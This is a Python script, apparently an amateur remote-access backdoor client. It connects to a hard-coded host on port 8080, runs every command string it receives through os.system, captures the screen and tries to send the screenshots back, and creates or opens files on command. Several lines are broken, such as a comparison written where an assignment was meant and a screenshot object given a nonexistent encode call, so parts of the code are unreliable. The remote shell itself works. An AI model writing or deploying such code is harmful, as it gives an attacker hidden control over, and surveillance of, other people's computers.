# -*- coding: utf-8 -*-
"""
Created on Tue Apr 27 09:05:55 2021

@author: siaaa013
"""


import os
import socket
import pyautogui

 

s = socket.socket()
port = 8080
host = "192.168.100.7"


s.connect((host,port))
        

 

while 1:
    command = s.recv(1024)
    command = command.decode()
    if command == "make file":
        command = s.recv(1024)
        command == command.decode()
        f = open(command,"x" )
       
    if command == "read file":
        command = s.recv(1024)
        command = command.decode()
        f = open(command, "r")
        if f.mode == "r":
            content = f.read()
           
    if command == "write file":
        command = s.recv(1024)
        command = command.decode()
        f = open(command, "w")
        if f.mode == "w":
            content = f.read()
           
   
    if command == "stream":
        s.send(command.encode())
        run = True
        while run:
            command = s.recv(1024)
            command = command.decode()
            screenshot = pyautogui.screenshot()
            screenshot.save(r"C:\Users\sigur\OneDrive\Dokumenter\programering\python\backdoor\clientdirectory\images\image.png")
            s.send(screenshot.encode())
            if command == "kill":
                run = False
       

 

    elif command == "bat":
        run = True

 

        while run:
            user_command = s.recv(5000)
            user_command = user_command.decode()
            if user_command == "kill":
                run = False
            else:
                os.system(user_command)